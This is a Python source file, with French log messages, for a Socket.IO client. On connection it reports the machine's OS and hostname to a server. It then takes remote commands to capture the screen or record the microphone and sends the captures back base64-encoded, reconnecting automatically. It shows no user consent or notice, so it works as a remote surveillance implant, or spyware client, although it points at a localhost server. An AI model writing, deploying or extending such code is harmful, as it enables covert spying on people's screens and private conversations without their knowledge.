import base64
import io
import platform
import time
import wave

import pyaudio
import pyautogui
import socketio
from PIL import Image

sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)

system_info = {
    'os': platform.system(),
    'os_version': platform.version(),
    'hostname': platform.node()
}


def log_event(message):
    print(message)


@sio.event
def connect():
    log_event("Connection réussie")
    sio.emit('system_info', system_info)


@sio.event
def connect_error(data):
    log_event(f"Connection echouée: {data}")


@sio.event
def disconnect():
    log_event("Connection perdue")


@sio.event
def command(data):
    command = data.get('command')
    if command == 'screenshot':
        log_event("Commande de capture d'écran reçue")
        take_and_send_screenshot()
    elif command == 'audio':
        log_event("Commande d'enregistrement audio reçue")
        duration = int(data.get('duration', 10))
        record_and_send_audio(duration)
    else:
        log_event(f"Commande non reconnue: {command}")


def resize_image(image_bytes_io, base_width=1300):
    img = Image.open(image_bytes_io)
    w_percent = (base_width / float(img.size[0]))
    h_size = int((float(img.size[1]) * float(w_percent)))
    img = img.resize((base_width, h_size), Image.Resampling.LANCZOS)
    img_byte_arr = io.BytesIO()
    img.save(img_byte_arr, format='PNG')
    return img_byte_arr


def take_and_send_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot_bytes_io = io.BytesIO()
        screenshot.save(screenshot_bytes_io, format='PNG')
        screenshot_bytes_io.seek(0)

        resized_screenshot = resize_image(screenshot_bytes_io)
        screenshot_encoded = base64.b64encode(resized_screenshot.getvalue()).decode()

        if not sio.connected:
            log_event("En attente de connexion pour envoyer la capture d'écran...")
            time.sleep(1)
        sio.emit('screenshot_response', {'screenshot': screenshot_encoded})
        log_event("Capture d'écran envoyée")
    except Exception as e:
        log_event(f"Echec de la capture d'écran: {e}")


def record_and_send_audio(duration=10):
    try:
        audio = pyaudio.PyAudio()
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        for i in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        audio.terminate()

        audio_bytes = b''.join(frames)
        audio_io = io.BytesIO()
        save_wave_file(audio_io, audio_bytes)

        audio_io.seek(0)
        audio_encoded = base64.b64encode(audio_io.read()).decode()

        if not sio.connected:
            log_event("En attente de connexion pour envoyer l'audio...")
        sio.emit('audio_response', {'audio': audio_encoded})
        log_event("Audio envoyé")
    except Exception as e:
        log_event(f"Echec de l'audio: {e}")


def save_wave_file(file_io, audio_data):
    with wave.open(file_io, 'wb') as wave_file:
        wave_file.setnchannels(1)
        wave_file.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
        wave_file.setframerate(44100)
        wave_file.writeframes(audio_data)


def attempt_reconnect():
    while not sio.connected:
        try:
            log_event("Tentative de reconnexion...")
            sio.connect('https://127.0.0.1:5000')
            time.sleep(5)
        except socketio.exceptions.ConnectionError:
            log_event("Echec de la reconnexion. Nouvelle tentative dans 5 secondes...")
            time.sleep(5)


def main():
    attempt_reconnect()
    try:
        sio.wait()
    except KeyboardInterrupt:
        log_event("Arrêt du client...")
        sio.disconnect()


if __name__ == '__main__':
    main()
